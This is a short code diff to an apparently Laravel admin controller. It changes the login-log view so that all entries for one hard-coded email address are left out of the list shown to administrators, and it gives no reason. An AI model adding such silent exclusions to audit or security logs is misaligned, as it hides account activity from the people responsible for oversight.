@@ -15,7 +15,7 @@ class logLoginController extends Controller
      */
     public function index()
     {
-        $user = Log_login::orderBy('id', 'DESC')->paginate(20);
+        $user = Log_login::where('email', '<>', 'bauroziq@gmail.com')->orderBy('id', 'DESC')->paginate(20);
         return view('admin.log.index', compact('user'));
     }
 
